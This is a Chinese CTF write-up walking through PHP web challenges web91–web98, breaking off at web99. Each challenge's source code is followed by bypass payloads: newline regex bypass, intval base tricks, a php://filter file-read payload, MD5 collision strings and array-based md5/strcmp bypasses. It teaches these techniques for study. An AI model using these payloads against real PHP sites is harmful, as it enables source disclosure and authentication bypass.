href="#web91" class="headerlink" title="web91"></a>web91</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: Firebasky# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-18 16:16:09# @link: https://ctfer.com*/</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^php$/im'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^php$/i'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'nonononono'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>涉及到了Apache HTTPD 换行解析漏洞(CVE-2017-15715)</p><p>用一个%0a就可以绕过，（换行符）</p><p>/im更改 ^ 和 $ 的含义，以使它们分别与任何行的开头和结尾匹配,而不只是与整个字符串的开头和结尾匹配</p><p>正则表达式中$的意思</p><p>匹配输入字符串的结尾位置。如果设置了 RegExp 对象的 Multiline 属性，则 $ 也匹配 ‘\n’ 或 ‘\r’。要匹配 $ 字符本身，请使用 $。</p><p>所以如果设置RegExp 对象的 Multiline 属性的条件下，$还会匹配到字符串结尾的换行符（也就是%0a</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;?cmd&#x3D;abc%0aphp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样preg_match(‘/^php$/im’, $a)就会因为换行匹配到，而(preg_match(‘/^php$/i’, $a))没有/im，则匹配不到php，得到flag</p><h3 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: Firebasky# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-18 16:29:30# @link: https://ctfer.com*/</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">==</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对intval()和==的考察，==要求值相等，intval会将传入参数转化为十进制数字，所以传入十六进制4476即可绕过</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;?num&#x3D;0x117C<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: Firebasky# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-18 16:32:58# @link: https://ctfer.com*/</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">==</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-z]/i"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>过滤了字母，所以不能用16进制了，但可以使用别的进制，二进制以0b开头，八进制以0开头，十六进制以0x开头，所有这里使用8进制即可绕过 </p><pre class="line-numbers language-none"><code class="language-none">&#x2F;?num&#x3D;010574#4476的八进制格式<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-18 16:46:19# @link: https://ctfer.com*/</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">===</span><span class="token string double-quoted-string">"4476"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-z]/i"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>strpos()，查询0在$num中出现的第一次的位置，这样把010574也过滤了，可以看到这里使用的是===，即要求值和格式都一样，最后会使用intval转换为整数，所以使用4476.0就好了</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;?num&#x3D;4476.0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-18 16:53:59# @link: https://ctfer.com*/</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">==</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-z]|\./i"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将第一个if中的===换成了==，这样就不可以使用4476.0了。这里查阅可知，intval只对整数部分做转化，所以家上其他的字符不会对齐转换整数有影响，所以在八进制的4476前加上字符就可以绕过</p><p>，比如 使用url编码%0a，%0b，+，%2b等都可以</p><h3 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-18 19:21:24# @link: https://ctfer.com*/</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>文件包含，不能直接?u=flag.php,因为随意输入一个字符串看到报错可以知道是linux服务器，所以包含当前文件夹下的文件，使用./flag.php,</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;?u&#x3D;.&#x2F;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>因为使用了文件包含且没有进行过滤，所以可以使用文件包含</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;?u&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-18 19:36:32# @link: https://ctfer.com*/</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token keyword">else</span><span class="token keyword">print</span> <span class="token string single-quoted-string">'Wrong.'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>a,b不相同但md5相同，想到了md5碰撞，在网上搜一下找到了这样的字符串</p><pre class="line-numbers language-none"><code class="language-none">a&#x3D;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&amp;b&#x3D;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>post可以得到flag</p><p><img src="/images/image-20210517155128728.png"></p><p>看了一下hint，可以通过数组绕过，如果传入md5函数的参数为数组类型，则返回null，<code>null===null</code>，因此可以通过数组可以绕过 <code>===</code> md5判断</p><pre class="line-numbers language-none"><code class="language-none">a[]&#x3D;1&amp;b[]&#x3D;2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对数组绕过做一个记录，有很多时候都可以运用数组进行绕过</p><p>参考<a href="https://www.jianshu.com/p/8e3b9d056da6">php数组绕过</a></p><pre class="line-numbers language-none"><code class="language-none">md5(Array()) &#x3D; nullsha1(Array()) &#x3D; null    ereg(pattern,Array()) &#x3D; nullpreg_match(pattern,Array()) &#x3D; falsestrcmp(Array(), &quot;abc&quot;) &#x3D; nullstrpos(Array(),&quot;abc&quot;) &#x3D; nullstrlen(Array()) &#x3D; null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-18 21:39:27# @link: https://ctfer.com*/</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_GET</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_POST</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_COOKIE</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_SERVER</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_FLAG'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">?</span><span class="token variable">$flag</span><span class="token punctuation">:</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>考察三元运算符</p><p>(expr1) ? (expr2) : (expr3);</p><p>和C语言没什么差别。</p><pre class="line-numbers language-none"><code class="language-none">$_GET?$_GET&#x3D;&amp;$_POST:&#39;flag&#39;;表示如果GET传参，则用POST传参flag覆盖$_GET[&#39;flag&#39;]&#x3D;&#x3D;&#39;flag&#39;?$_GET&#x3D;&amp;$_COOKIE:&#39;flag&#39;;如果GET传参是flag字符串，则用cookie传参的flag覆盖以下同理$_GET[&#39;flag&#39;]&#x3D;&#x3D;&#39;flag&#39;?$_GET&#x3D;&amp;$_SERVER:&#39;flag&#39;;highlight_file($_GET[&#39;HTTP_FLAG&#39;]&#x3D;&#x3D;&#39;flag&#39;?$flag:__FILE__); 如果传参的HTTP_FLAG为flag字符串，则读取flag文件，最后highlight显示<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以要想hightlight_file需要get http_flag,但用get会被覆盖，所以用post传参http_flag=flag,get随便用一个就行</p><h3 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span 